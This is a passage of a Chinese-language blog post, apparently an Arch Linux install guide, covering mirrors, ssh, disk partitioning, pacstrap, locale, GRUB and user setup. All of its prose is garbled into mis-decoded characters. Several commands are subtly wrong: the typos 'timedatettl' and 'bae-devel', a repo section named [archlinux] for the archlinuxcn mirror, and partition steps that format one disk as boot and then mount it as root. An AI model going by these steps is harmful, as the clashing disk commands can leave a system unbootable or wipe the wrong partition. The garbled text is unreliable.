¼å¼ä¸º:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">modinfo &lt;<span class="hljs-built_in">driver</span> <span class="hljs-built_in">name</span>&gt;<br></code></pre></td></tr></table></figure><h5 id="ä½¿ç”¨-ethtool-æŸ¥çœ‹"><a href="#ä½¿ç”¨-ethtool-æŸ¥çœ‹" class="headerlink" title="ä½¿ç”¨ ethtool æŸ¥çœ‹"></a>ä½¿ç”¨ ethtool æŸ¥çœ‹</h5><p>å¯èƒ½éœ€è¦å…ˆå®‰è£…ï¼Œåœ¨ Ubuntu ä¸­:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install ethtool<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ ethtool (ethernet tool) æ¥æŸ¥çœ‹ç½‘å¡åå¯¹åº”çš„ç½‘å¡é©±åŠ¨åä»¥åŠç½‘å¡é©±åŠ¨ç‰ˆæœ¬å·, æ ¼å¼ä¸º:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">ethtool -i <span class="hljs-tag">&lt;<span class="hljs-name">NIC</span> <span class="hljs-attr">name</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="ä½¿ç”¨-lshw-å‘½ä»¤æŸ¥çœ‹"><a href="#ä½¿ç”¨-lshw-å‘½ä»¤æŸ¥çœ‹" class="headerlink" title="ä½¿ç”¨ lshw å‘½ä»¤æŸ¥çœ‹"></a>ä½¿ç”¨ lshw å‘½ä»¤æŸ¥çœ‹</h5><p>lshw (list hardware) å¯ä»¥æŸ¥è¯¢åˆ°ç½‘å¡å¯¹åº”çš„ç½‘å¡é©±åŠ¨ä¿¡æ¯ä»¥åŠç½‘å¡é©±åŠ¨ç‰ˆæœ¬å·:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">sudo lshw -<span class="hljs-keyword">class</span> <span class="hljs-symbol">network</span>  <br></code></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹ç½‘å¡ç”Ÿäº§å•†"><a href="#æŸ¥çœ‹ç½‘å¡ç”Ÿäº§å•†" class="headerlink" title="æŸ¥çœ‹ç½‘å¡ç”Ÿäº§å•†"></a>æŸ¥çœ‹ç½‘å¡ç”Ÿäº§å•†</h4><p>å…ˆä¸‹è½½ä¸€äº›ç½‘ç»œè¯Šæ–­å·¥å…·:</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">pacman -S <span class="hljs-built_in">net</span>-tools<br></code></pre></td></tr></table></figure><p>å…ˆæŸ¥çœ‹ç½‘å¡ä¿¡æ¯:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure><p>é‡Œé¢ä¸€ä¸²æ ¼å¼ç±»ä¼¼ä¸º: <code>00-00-00-AA-BB-CC</code> çš„å°±æ˜¯ MAC åœ°å€.</p><p>å¾—åˆ°ä¸€ä¸ªç½‘å¡çš„ MAC åœ°å€åï¼Œæ‰“å¼€ä¸€ä¸ªæŸ¥è¯¢å·¥å…· (<a href="https://itool.co/mac">å·¥å…·</a>) è¾“å…¥ MAC åœ°å€å°±å¯ä»¥æŸ¥åˆ°ç½‘å¡ç”Ÿäº§å•†çš„ä¿¡æ¯.</p><p>è¿™é‡Œæä¸€ä¸‹ MAC åœ°å€çš„ç»“æ„ï¼Œå¦‚ <code>A1-B2-C3-D4-E5-F6</code>, å‰ä¸‰ä¸ªä¸ºå‚å•†å”¯ä¸€ï¼Œåä¸‰ä¸ªä¸ºå‚å•†åˆ†é…çš„.</p><h2 id="æ›´æ–°ç³»ç»Ÿæ—¶é—´"><a href="#æ›´æ–°ç³»ç»Ÿæ—¶é—´" class="headerlink" title="æ›´æ–°ç³»ç»Ÿæ—¶é—´"></a>æ›´æ–°ç³»ç»Ÿæ—¶é—´</h2><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">timedatectl</span> <span class="hljs-built_in">set-ntp</span> <span class="hljs-string">true</span> <br><span class="hljs-string">timedatettl</span> <span class="hljs-string">status</span><br></code></pre></td></tr></table></figure><h2 id="é…ç½®-pacman"><a href="#é…ç½®-pacman" class="headerlink" title="é…ç½® pacman"></a>é…ç½® pacman</h2><p><code>pacman -S</code> ä¸­ <code>S</code> çš„å«ä¹‰æ˜¯ â€œSynchronismâ€<br>é…ç½®æ–‡ä»¶ä¸º <code>/etc/pacman.conf</code>, å…¶ä¸­ï¼Œå»é™¤ <code>#Color</code> å‰é¢çš„ <code>#</code> æ³¨é‡Šç¬¦ï¼Œ<code>Color</code> çš„æ„æ€æ˜¯åœ¨å®‰è£…è½¯ä»¶åŒ…æ—¶ï¼Œä¼šç»™å‡ºå½©è‰²çš„æç¤ºï¼Œè€Œä¸æ˜¯é»‘ç™½.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pacman -S archlinux-keyring<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸­:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">[core]<br><span class="hljs-keyword">Include</span> = <span class="hljs-regexp">/etc/</span>pacman.d/mirrorlist<br>[extra]<br><span class="hljs-keyword">Include</span> = <span class="hljs-regexp">/etc/</span>pacman.d/mirrorlist<br>[community]<br><span class="hljs-keyword">Include</span> = <span class="hljs-regexp">/etc/</span>pacman.d/mirrorlist<br></code></pre></td></tr></table></figure><p>è¿™äº›éƒ½ä»£è¡¨ arch çš„è½¯ä»¶æº. è¿™ä¸ª <code>mirrorlist</code> é‡Œé¢è®°å½•çš„æ˜¯ arch è½¯ä»¶æºæœåŠ¡å™¨çš„åœ°å€.</p><p>è¿›å…¥æ–‡ä»¶åæŠŠ China çš„æ”¾åœ¨æœ€é¡¶ä¸Šï¼Œå› ä¸º pacman æ˜¯ä»ä¸Šå¾€ä¸‹è¯»å–.</p><p>åˆ©ç”¨ vim çš„å®å½•åˆ¶å¯ä»¥å¹²å¾ˆå¤šé‡å¤çš„å·¥ä½œ.</p><p>åœ¨ vim ä¸­å¯»æ‰¾ç©ºè¡Œä¸º <code>/^\n</code></p><p>archlinuxcn ä¸­çš„æºå¾ˆå¤šä¸æ˜¯å®˜æ–¹ç¼–è¯‘ã€‚</p><h2 id="æ¢æº"><a href="#æ¢æº" class="headerlink" title="æ¢æº"></a>æ¢æº</h2><p>å…ˆå¤‡ä»½:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp -a <span class="hljs-regexp">/etc/</span>pacman.d<span class="hljs-regexp">/mirrorlist /</span>etc<span class="hljs-regexp">/pacman.d/mi</span>rrorlist.bak <br></code></pre></td></tr></table></figure><p>æ·»åŠ åä¸ºçš„æºå’Œé˜¿é‡Œäº‘çš„æº:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">Server = https:<span class="hljs-regexp">//</span>repo.huaweicloud.com<span class="hljs-regexp">/archlinux/</span><span class="hljs-variable">$repo</span><span class="hljs-regexp">/os/</span><span class="hljs-variable">$arch</span><br>Server = https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/archlinux/</span><span class="hljs-variable">$repo</span><span class="hljs-regexp">/os/</span><span class="hljs-variable">$arch</span><br></code></pre></td></tr></table></figure><p>æ›´æ–°:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -Syy</span><br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨-ssh-è¿æ¥"><a href="#ä½¿ç”¨-ssh-è¿æ¥" class="headerlink" title="ä½¿ç”¨ ssh è¿æ¥"></a>ä½¿ç”¨ ssh è¿æ¥</h2><p>ä½¿ç”¨ <code>ssh</code> è¿æ¥åå®‰è£…æ¯”è¾ƒæ–¹ä¾¿, å› æ­¤å…ˆ:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># pacman -Syy openssh</span><br></code></pre></td></tr></table></figure><p>å¯åŠ¨ <code>sshd</code>:</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>ctl enable sshd<br><span class="hljs-params">system</span>ctl start sshd<br><span class="hljs-params">system</span>ctl status sshd<br></code></pre></td></tr></table></figure><p>å…ˆä¿®æ”¹ä¸€ä¸‹ root å¯†ç ï¼Œæ–¹ä¾¿è¿æ¥:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">passwd root</span> <br></code></pre></td></tr></table></figure><p>ç„¶åå›åˆ°è‡ªå·±çš„ç»ˆç«¯è¿›è¡Œ ssh è¿æ¥:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>ssh root<span class="hljs-variable">@ip</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ª ip åé¢æ²¡æœ‰ç«¯å£å·.</p><h2 id="ç£ç›˜åˆ†åŒºåŠæ ¼å¼åŒ–"><a href="#ç£ç›˜åˆ†åŒºåŠæ ¼å¼åŒ–" class="headerlink" title="ç£ç›˜åˆ†åŒºåŠæ ¼å¼åŒ–"></a>ç£ç›˜åˆ†åŒºåŠæ ¼å¼åŒ–</h2><p>å…ˆç”¨ <code>fdisk -l</code> å‘½ä»¤æŸ¥çœ‹ç£ç›˜ä½ç½®, ç„¶åç”¨ <code>fdisk</code> å‘½ä»¤ç›´æ¥åˆ†åŒºã€‚å¦‚ <code>fdisk /dev/vda</code></p><p>ä¹‹åæ ¼å¼åŒ–ç£ç›˜, <code>boot</code> åˆ†åŒºæ ¼å¼åŒ–ä¸º <code>fat32</code>ï¼Œå¦‚ <code>mkfs.fat -F 32 /dev/vda2</code></p><p><code>/</code> æ ¹ç›®å½•åˆ†åŒºæ ¼å¼åŒ–ä¸º <code>ext4</code>, å¦‚ <code>mkfs.ext4 /dev/vda1</code></p><p>å°†åˆ†åŒºæŒ‚è½½ï¼Œå…ˆæŒ‚è½½ <code>/</code> æ ¹åˆ†åŒºåˆ° <code>/mnt</code> ç›®å½•:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">mount /dev/vda2 /mnt</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°† <code>boot</code> åˆ†åŒºæŒ‚è½½åˆ° <code>/mnt/boot</code>, å…ˆå¾—åˆ›å»ºä¸€ä¸ªç›®å½•:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># mkdir <span class="hljs-regexp">/mnt/</span>boot<br># mount <span class="hljs-regexp">/dev/</span>vda1 <span class="hljs-regexp">/mnt/</span>boot<br></code></pre></td></tr></table></figure><h2 id="å®‰è£…ç³»ç»Ÿ"><a href="#å®‰è£…ç³»ç»Ÿ" class="headerlink" title="å®‰è£…ç³»ç»Ÿ"></a>å®‰è£…ç³»ç»Ÿ</h2><p>å®‰è£…å‡ ä¸ªå·¥å…·:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># pacstrap /mnt base bae-devel linux linux-firmware dhcpcd e2fsprogs iwd</span><br></code></pre></td></tr></table></figure><p><code>base</code> åŒ…åŒ…å« 20 æ¥ä¸ªåŸºç¡€çš„è½¯ä»¶.</p><p><code>linux</code> æ˜¯ linux å†…æ ¸ã€‚</p><p><code>linux-firmware</code> æ˜¯ linux çš„æ¡†æ¶.</p><p><code>base-devel</code> ä¸­ä¹ŸåŒæ ·æœ‰é‡è¦çš„ packages, æ¯”å¦‚ GCC å’Œ make.</p><p>è¿™é‡Œ <code>dhcpcd</code> æ˜¯ç”¨æ¥åŠ¨æ€è·å– ip çš„ã€‚</p><p><code>e2fsprogs</code> æ˜¯ä¸€ä¸ª Ext2 (åŠ Ext3&#x2F;4) æ–‡ä»¶ç³»ç»Ÿå·¥å…·ï¼Œå®ƒåŒ…å«äº†è¯¸å¦‚åˆ›å»ºã€ä¿®å¤ã€é…ç½®ã€è°ƒè¯• ext2 æ–‡ä»¶ç³»ç»Ÿç­‰çš„æ ‡å‡†å·¥å…·.</p><p><code>iwd</code> æ˜¯ iNet Wireless Daemon é¡¹ç›®ï¼Œæ—¨åœ¨åŸºäº Linux è®¾å¤‡æä¾›å…¨é¢çš„ Wi-Fi è¿æ¥è§£å†³æ–¹æ¡ˆã€‚<br>pacstrap æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œå®ƒä¼šå¾€ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œé¢å®‰è£…ä½ æƒ³è¦çš„è½¯ä»¶ï¼Œå½“å‰æœªå°†æ ¹ç›®å½•æŒ‚è½½åˆ° <code>/mnt</code> æ—¶ï¼Œå…¶æ‰€åœ¨ç¯å¢ƒä¸ºå¯åŠ¨ç›˜æ‰€åœ¨çš„ä½ç½®è€Œä¸æ˜¯ç³»ç»Ÿç›˜. å› æ­¤éœ€è¦æŠŠæ ¹ç›®å½•æŒ‚è½½. </p><h3 id="ç”Ÿæˆæ–‡ä»¶ç³»ç»Ÿè¡¨"><a href="#ç”Ÿæˆæ–‡ä»¶ç³»ç»Ÿè¡¨" class="headerlink" title="ç”Ÿæˆæ–‡ä»¶ç³»ç»Ÿè¡¨"></a>ç”Ÿæˆæ–‡ä»¶ç³»ç»Ÿè¡¨</h3><p>ç”¨äºè‡ªåŠ¨æŒ‚è½½åˆ†åŒºï¼Œä¸ç„¶ç³»ç»Ÿæ— æ³•æ­£å¸¸å¯åŠ¨.</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># genfstab -U <span class="hljs-regexp">/mnt &gt;&gt; /m</span>nt<span class="hljs-regexp">/etc/</span>fstab<br># cat <span class="hljs-regexp">/mnt/</span>etc/fstab<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›å…¥åˆ°æˆ‘ä»¬å®‰è£…çš„ç³»ç»Ÿï¼Œå¯¹ç³»ç»Ÿè¿›è¡Œé…ç½®:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">arch-chroot /mnt</span><br></code></pre></td></tr></table></figure><h3 id="è®¾ç½®æ—¶åŒº"><a href="#è®¾ç½®æ—¶åŒº" class="headerlink" title="è®¾ç½®æ—¶åŒº"></a>è®¾ç½®æ—¶åŒº</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">ln -sf <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/zoneinfo/</span>Asia<span class="hljs-regexp">/Shanghai /</span>etc/localtime<br><span class="hljs-comment"># åŒæ­¥ç¡¬ä»¶æ—¶é’Ÿ</span><br>hwclock --systohc<br></code></pre></td></tr></table></figure><h3 id="æœ¬åœ°åŒ–"><a href="#æœ¬åœ°åŒ–" class="headerlink" title="æœ¬åœ°åŒ–"></a>æœ¬åœ°åŒ–</h3><p>Local æ˜ç¡®è§„å®šäº†åœ°åŸŸã€è´§å¸ã€æ—¶åŒºæ—¥æœŸçš„æ ¼å¼ã€å­—ç¬¦æ’åˆ—æ–¹å¼å’Œå…¶ä»–æœ¬åœ°åŒ–æ ‡å‡†.</p><p>ç”Ÿæˆ Local ä¿¡æ¯</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">sed -i <span class="hljs-string">&#x27;s/^#en_US.UTF-8/en_US.UTF-8/&#x27;</span> <span class="hljs-regexp">/etc/</span>locale.gen<br>sed -i <span class="hljs-string">&#x27;s/^#zh_CN.UTF-8/zh_CN.UTF-8/&#x27;</span> <span class="hljs-regexp">/etc/</span>locale.gen<br>locale-gen<br></code></pre></td></tr></table></figure><p>åˆ›å»º locale.conf æ–‡ä»¶ï¼Œå¹¶ç¼–è¾‘è®¾å®š LANG å˜é‡:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;LANG=en_US.UTF-8&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>locale.conf<br></code></pre></td></tr></table></figure><p>ä¸»æœºåé…ç½®:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;ArchLinux&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>hostname<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆå¯¹åº” hosts, å°† <code>hostname</code> æ¢æˆè‡ªå·±è®¾ç½®çš„:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo -e <span class="hljs-string">&quot;127.0.0.1 localhost\n::1 localhost\n127.0.1.1 hostname.localdomain hostname&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure><p>è®¾ç½® root å¯†ç :</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">passwd root</span><br></code></pre></td></tr></table></figure><h3 id="å®‰è£…å¼•å¯¼ç¨‹åº"><a href="#å®‰è£…å¼•å¯¼ç¨‹åº" class="headerlink" title="å®‰è£…å¼•å¯¼ç¨‹åº"></a>å®‰è£…å¼•å¯¼ç¨‹åº</h3><p>å®‰è£… Linux å¼•å¯¼åŠ è½½ç¨‹åºï¼Œæ‰èƒ½åœ¨å®‰è£…åå¯åŠ¨ç³»ç»Ÿ.</p><h4 id="å®‰è£…å¾½ç "><a href="#å®‰è£…å¾½ç " class="headerlink" title="å®‰è£…å¾½ç "></a>å®‰è£…å¾½ç </h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># amd ç”µè„‘å®‰è£…</span><br><span class="hljs-attribute">pacman</span> -S amd-ucode<br><span class="hljs-comment"># intel ç”µè„‘å®‰è£…</span><br>pacman -S intel-ucode<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>intel-ucode</code> æ˜¯å‚å®¶æˆ–ç¨‹åºæä¾›å•†æ¥ä¸ºä½ çš„ç”µè„‘ cpu æ›´æ–°ä¸€äº›é©±åŠ¨.</p><h4 id="é…ç½®-grub"><a href="#é…ç½®-grub" class="headerlink" title="é…ç½® grub"></a>é…ç½® grub</h4><p>Arch ä½¿ç”¨ grub2 ç®¡ç†å¼•å¯¼ï¼Œå®‰è£…ç›¸å…³ç¨‹åº:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S grub efibootmgr efivar os-prober</span><br></code></pre></td></tr></table></figure><h4 id="å®‰è£…å¼•å¯¼"><a href="#å®‰è£…å¼•å¯¼" class="headerlink" title="å®‰è£…å¼•å¯¼"></a>å®‰è£…å¼•å¯¼</h4><p>åœ¨å®‰è£… <code>grub</code> ä¹‹å‰ï¼Œéœ€è¦å…ˆç¡®è®¤ç³»ç»Ÿæ¶æ„æ˜¯ä»€ä¹ˆ.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">uname</span> -m</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">grub-install <span class="hljs-attribute">--target</span>=x86_64-efi <span class="hljs-attribute">--efi-directory</span>=/boot <span class="hljs-attribute">--bootloader-id</span>=Arch --recheck<br><span class="hljs-comment"># --bootloader-id=name ä¸­çš„nameå¯æ”¹</span><br></code></pre></td></tr></table></figure><p>grub2 é»˜è®¤ç¦ç”¨äº† os-prober, å¦‚æœæ˜¯é€‰æ‹©åŒç³»ç»Ÿæˆ–å¤šç³»ç»Ÿå®‰è£…ï¼Œéœ€æ‰‹åŠ¨å¼€å¯è¯¥é€‰é¡¹ã€‚</p><p>os-prober å¯ä»¥æ£€æŸ¥å…¶ä»–ç¡¬ç›˜ä¸Šçš„å…¶ä»–ç³»ç»Ÿå¼•å¯¼, å¦‚æœä¸å¼€å¯ï¼Œå¯èƒ½æ— æ³•è¯†åˆ«å…¶ä»–ç³»ç»Ÿ.</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">echo <span class="hljs-string">&quot;GRUB_DISABLE_OS_PROBER=false&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span><span class="hljs-keyword">default</span>/grub <br></code></pre></td></tr></table></figure><h4 id="ç”Ÿæˆå¼•å¯¼é…ç½®æ–‡ä»¶"><a href="#ç”Ÿæˆå¼•å¯¼é…ç½®æ–‡ä»¶" class="headerlink" title="ç”Ÿæˆå¼•å¯¼é…ç½®æ–‡ä»¶"></a>ç”Ÿæˆå¼•å¯¼é…ç½®æ–‡ä»¶</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">grub-mkconfig -o <span class="hljs-regexp">/boot/g</span>rub/grub.cfg<br></code></pre></td></tr></table></figure><h3 id="é…ç½®å¼€æœºå¯åŠ¨é¡¹"><a href="#é…ç½®å¼€æœºå¯åŠ¨é¡¹" class="headerlink" title="é…ç½®å¼€æœºå¯åŠ¨é¡¹"></a>é…ç½®å¼€æœºå¯åŠ¨é¡¹</h3><p>å¼€æœºåè‡ªåŠ¨è¿æ¥ç½‘ç»œ, éœ€ä¸‹è½½è”ç½‘ç¨‹åºå¹¶è®¾ç½®å¼€æœºè‡ªå¯åŠ¨:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># ä¸‹è½½ wifi ç®¡ç†</span><br>pacman -S dhcpcd iwd networkmanager<br><span class="hljs-comment"># è®¾ç½®å¯åŠ¨é¡¹</span><br>systemctl <span class="hljs-built_in">enable</span> dhcpcd<br>systemctl <span class="hljs-built_in">enable</span> iwd<br>systemctl <span class="hljs-built_in">enable</span> NetworkManager<br></code></pre></td></tr></table></figure><h3 id="ARU-æ·»åŠ -ArchlinuxCN"><a href="#ARU-æ·»åŠ -ArchlinuxCN" class="headerlink" title="ARU æ·»åŠ  ArchlinuxCN"></a>ARU æ·»åŠ  ArchlinuxCN</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># /etc/pacman.conf</span><br>[archlinux]<br>Server = http:<span class="hljs-regexp">//mi</span>rror.lzu.edu.cn<span class="hljs-regexp">/archlinuxcn/</span><span class="hljs-variable">$arch</span><br></code></pre></td></tr></table></figure><p>å»æ‰ <code># Color</code> å‰çš„æ³¨é‡Šç¬¦.</p><p>ç„¶åæ›´æ–°ä¸€ä¸‹:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -Syy</span> <br></code></pre></td></tr></table></figure><p>è‹¥æŠ¥é”™åˆ™éœ€è·å– gpg å¯†é’¥:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm -rf <span class="hljs-regexp">/etc/</span>pacman.d<span class="hljs-regexp">/gnupg/</span><br>pacman-key --init<br>pacman-key --populate archlinux archlinuxcn<br>pacman -Syy<br></code></pre></td></tr></table></figure><h3 id="ç»“æŸ"><a href="#ç»“æŸ" class="headerlink" title="ç»“æŸ"></a>ç»“æŸ</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># é€€å‡º arch root å®‰è£…ç¯å¢ƒ</span><br><span class="hljs-keyword">exit</span> <br><span class="hljs-comment"># å–æ¶ˆæŒ‚è½½</span><br>umount -R /mnt<br><span class="hljs-comment"># é‡å¯</span><br>reboot<br></code></pre></td></tr></table></figure><h3 id="è‹¥-win-å’Œ-Ubuntu-çš„å¼•å¯¼è®°å½•åœ¨-grub-ä¸­æ¶ˆå¤±"><a href="#è‹¥-win-å’Œ-Ubuntu-çš„å¼•å¯¼è®°å½•åœ¨-grub-ä¸­æ¶ˆå¤±" class="headerlink" title="è‹¥ win å’Œ Ubuntu çš„å¼•å¯¼è®°å½•åœ¨ grub ä¸­æ¶ˆå¤±"></a>è‹¥ win å’Œ Ubuntu çš„å¼•å¯¼è®°å½•åœ¨ grub ä¸­æ¶ˆå¤±</h3><p>å®é™…ä¸Šçš„å¼•å¯¼è®°å½•è¿˜æ˜¯å­˜åœ¨çš„ï¼Œå¯ä»¥é€šè¿‡ <code>/etc/efi</code> ç›®å½•ä¸‹æŸ¥çœ‹.</p><p>è¦æ‰¾åˆ°å¯åŠ¨ Ubuntu å’Œ Win çš„æ–¹æ³•ï¼Œå¯ä»¥åœ¨ BIOS ä¸­è¿›è¡Œé¡ºåºçš„åˆ‡æ¢.</p><h3 id="æ–°å»ºç”¨æˆ·"><a href="#æ–°å»ºç”¨æˆ·" class="headerlink" title="æ–°å»ºç”¨æˆ·"></a>æ–°å»ºç”¨æˆ·</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">useradd -m -G wheel -s <span class="hljs-regexp">/bin/</span>bash &lt;username&gt;<br></code></pre></td></tr></table></figure><p>è®¾ç½®ç”¨æˆ·å¯†ç :</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">passwd <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br></code></pre></td></tr></table></figure><p>èµ‹äºˆç”¨æˆ· sudo æƒé™, ä¿®æ”¹ <code>/etc/sudoers</code> æ–‡ä»¶, å»æ‰ <code>%wheel</code> è¡Œä¹‹å‰çš„æ³¨é‡Š. éœ€è¦å…ˆä¿®æ”¹æ–‡ä»¶æƒé™ã€‚</p><h3 id="å®‰è£…-dwm-çª—å£ç®¡ç†å™¨"><a href="#å®‰è£…-dwm-çª—å£ç®¡ç†å™¨" class="headerlink" title="å®‰è£… dwm çª—å£ç®¡ç†å™¨"></a>å®‰è£… dwm çª—å£ç®¡ç†å™¨</h3><p><a href="https://www.cnblog.com/language/p/154415">å‚è€ƒåšå®¢</a><br><a href="https://b23.tv/F1W9Gmm">å‚è€ƒbç«™</a><br>å…ˆè¯´ä¸€ä¸ªè¯¯ä¼šï¼Œè‡ªå·±åœ¨å‚è€ƒä¸€ä¸ªè§†é¢‘åæ‹‰å–äº†åˆ«äººçš„ pwm ä»“åº“ï¼Œç„¶åå®‰è£…åä¸çŸ¥é“å¦‚ä½•ä½¿ç”¨ï¼Œé‡æ–°å®‰è£…åŸå§‹åŒ…å³å¯.</p><h4 id="æ¡Œé¢ç¯å¢ƒä¸çª—å£ç®¡ç†å™¨æ¦‚è¿°"><a href="#æ¡Œé¢ç¯å¢ƒä¸çª—å£ç®¡ç†å™¨æ¦‚è¿°" class="headerlink" 